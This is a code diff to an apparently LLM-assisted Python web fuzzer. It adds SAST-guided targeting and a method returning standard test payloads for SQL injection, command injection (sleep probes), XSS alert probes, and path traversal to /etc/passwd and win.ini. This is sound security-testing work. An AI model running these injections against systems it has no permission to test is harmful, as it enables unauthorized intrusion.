@@ -5,11 +5,13 @@ from typing import List, Dict, Any
 import llm
 
 class Fuzzer:
-    def __init__(self, targets: List[Dict[str, Any]], session_cookie: str = None):
+    def __init__(self, targets: List[Dict[str, Any]], session_cookie: str = None, guided_insights: List[Dict[str, Any]] = None):
         """
         targets: List of dicts, each with {url, method, params, form_fields}
+        guided_insights: List of dicts from SAST, {url_pattern, param, vulnerability_type}
         """
         self.targets = targets
+        self.guided_insights = guided_insights or []
         self.session = requests.Session()
         
         # Inject cookie if provided for authenticated fuzzing
@@ -20,6 +22,21 @@ class Fuzzer:
         sample_urls = [t["url"] for t in self.targets[:5]] if self.targets else []
         self.payloads = llm.generate_fuzzing_payloads(sample_urls)
         print(f"[*] Loaded {len(self.payloads)} custom testing payloads from LLM.")
+        if self.guided_insights:
+            print(f"[*] Fuzzer is ARMED with {len(self.guided_insights)} guided insights from SAST.")
+
+    def _get_specialized_payloads(self, vuln_type: str) -> List[str]:
+        """Returns targeted payloads for a specific vulnerability type."""
+        vt = vuln_type.lower()
+        if "sql" in vt:
+            return ["' OR 1=1 --", "' UNION SELECT 1,2,3--", "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"]
+        if "command" in vt or "rce" in vt:
+            return ["; sleep 5;", "`sleep 5`", "| sleep 5", "& sleep 5 &", "|| sleep 5"]
+        if "xss" in vt:
+            return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
+        if "path" in vt or "traversal" in vt:
+            return ["../../../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd"]
+        return self.payloads
         
     def attack_target(self, target: Dict[str, Any]) -> List[Dict[str, Any]]:
         """
@@ -37,7 +54,14 @@ class Fuzzer:
         
         # 1. Inject into existing query parameters (Always try)
         for param_name in params:
-            for payload in self.payloads:
+            # Check for guided insights for this parameter
+            relevant_insights = [i for i in self.guided_insights if i.get("param") == param_name]
+            target_payloads = self.payloads
+            if relevant_insights:
+                vuln_type = relevant_insights[0].get("vulnerability_type", "unknown")
+                target_payloads = self._get_specialized_payloads(vuln_type)
+
+            for payload in target_payloads:
                 modified_params = params.copy()
                 modified_params[param_name] = [payload]
                 
